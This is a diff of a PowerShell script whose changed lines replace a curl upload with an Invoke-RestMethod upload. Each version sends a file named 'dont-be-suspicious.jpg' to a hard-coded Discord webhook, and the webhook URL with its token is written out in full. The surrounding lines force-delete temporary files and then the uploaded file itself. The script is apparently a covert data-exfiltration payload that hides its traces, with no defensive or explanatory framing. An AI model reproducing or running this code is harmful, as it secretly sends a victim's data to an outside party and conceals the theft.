@@ -294,8 +294,24 @@ rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
 
 cd desktop
 
-curl -X POST -H "Content-Type: multipart/form-data" -F "content=boe" -F "file=@dont-be-suspicious.jpg" "https://discord.com/api/webhooks/1142771187911491634/-dCQIMjVWOGb44g8_thI5jTXQgbBuyo0Tskjds4q9iRoP5pOAZXypUroz9u_X8PfbT03"
+# Create a temporary file to store the message and image data
+$uploadFile = "$env:TEMP\dont-be-suspicious.jpg"
+$content | Out-File $uploadFile
 
+# Define the Discord webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1142771187911491634/-dCQIMjVWOGb44g8_thI5jTXQgbBuyo0Tskjds4q9iRoP5pOAZXypUroz9u_X8PfbT03"
+
+# Create a hashtable for the multipart form data
+$formData = @{
+    content = "boe"
+    file = [System.IO.File]::ReadAllBytes($uploadFile)
+}
+
+# Send the file to the Discord webhook
+$response = Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data" -InFile $uploadFile -Body $formData
+
+# Clean up the temporary file
+Remove-Item -Path $uploadFile -Force
 
 # Delete the file from the Desktop
 Remove-Item -Path "dont-be-suspicious.jpg" -Force
